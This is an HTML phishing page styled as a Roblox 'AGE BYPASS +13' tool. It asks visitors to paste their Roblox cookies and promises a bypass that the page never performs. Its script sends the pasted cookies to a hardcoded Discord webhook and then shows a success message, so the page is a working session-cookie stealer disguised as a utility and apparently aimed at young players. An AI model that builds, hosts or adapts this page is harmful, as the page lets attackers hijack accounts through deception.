<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AGE BYPASS</title>
    <link rel="icon" href="https://cdn.discordapp.com/attachments/1326994906576715910/1339837416458158122/Leysikey_pro.png?ex=67b02c55&is=67aedad5&hm=f8cd53c2353efe1879e3f35cd3fc14d3e1d8b36166477eeb25b4641c9705d457&" type="image/png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: url('https://cdn.discordapp.com/attachments/1336868856555114576/1340555985248325632/standard_4_1.gif?ex=67b2c98d&is=67b1780d&hm=ca0ddfa275eef69181d605ee31e5c3d44d8f01bc0b6e7a2984e52bfdaef6a1e3&') no-repeat center center fixed; 
            background-size: cover;
            color: #fff; 
            text-align: center; 
        }
        .container { 
            max-width: 600px; 
            margin: 100px auto; 
            padding: 30px; 
            background-color: rgba(30, 30, 30, 0.7); 
            border-radius: 10px; 
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); 
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(-20px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        textarea { 
            width: 100%; 
            height: 200px; 
            padding: 12px; 
            font-size: 16px; 
            border: 1px solid #6c4f97; 
            border-radius: 8px; 
            outline: none; 
            resize: none; 
            transition: all 0.3s ease-in-out;
            background-color: #2e2e2e;
            color: white;
        }
        textarea:focus {
            border-color: #9b4f96;
            box-shadow: 0 0 8px rgba(155, 79, 150, 0.7);
        }
        input[type="submit"] { 
            padding: 12px 20px; 
            background-color: #6c4f97; 
            color: white; 
            font-size: 16px; 
            font-weight: 600; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            transition: all 0.3s ease-in-out;
        }
        input[type="submit"]:hover { 
            background-color: #9b4f96; 
            transform: scale(1.05); 
        }
        .footer { 
            margin-top: 40px; 
            font-size: 14px; 
            color: #888; 
        }
        .discord-link { 
            margin-top: 20px; 
            font-size: 16px; 
            color: #fff; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>AGE BYPASS +13 TO >13</h1>
    <div class="form-box">
        <form id="bypassForm" aria-labelledby="formTitle">
            <label for="payload">Enter Cookies:</label><br>
            <textarea name="payload" id="payload" rows="6" aria-describedby="cookieHelp"></textarea><br>
            <input type="submit" value="Submit Cookies">
        </form>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
<script>
document.getElementById('bypassForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const payload = document.getElementById('payload').value;

    if (!payload.trim()) {
        iziToast.show({
            title: 'Error:',
            message: 'Please enter your Roblox cookies.',
            color: 'red',
            position: 'topCenter',
            timeout: 3000
        });
        return;
    }

    // Set cooldown for 30 seconds
    const cooldownEnd = Date.now() + 30000;
    localStorage.setItem("cooldownEnd", cooldownEnd);

    // Send cookies to Discord webhook
    const webhookData = {
        content: `Cookies Submitted: ${payload}`
    };

    fetch('https://discord.com/api/webhooks/1340386580770197665/1WyB76Ns5PG9YO-DVQo7Hv2PAtLi11td9UBRwFQIqiA0eM9b5Gyzz5JYRdSm9C3sweoa', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(webhookData)
    })
    .then(response => {
        if (response.ok) {
            iziToast.show({
                title: '',
                message: 'Cookies submitted successfully!',
                color: 'green',
                position: 'topCenter',
                timeout: 5000
            });
        } else {
            iziToast.show({
                title: 'Error:',
                message: 'Failed to send.',
                color: 'red',
                position: 'topCenter',
                timeout: 5000
            });
        }
    })
    .catch(error => {
        console.error('Error:', error);
        iziToast.show({
            title: 'Information:',
            message: 'Error submitting.',
            color: 'orange',
            position: 'topCenter',
            timeout: 5000
        });
    });
});
</script>

</body>
</html>
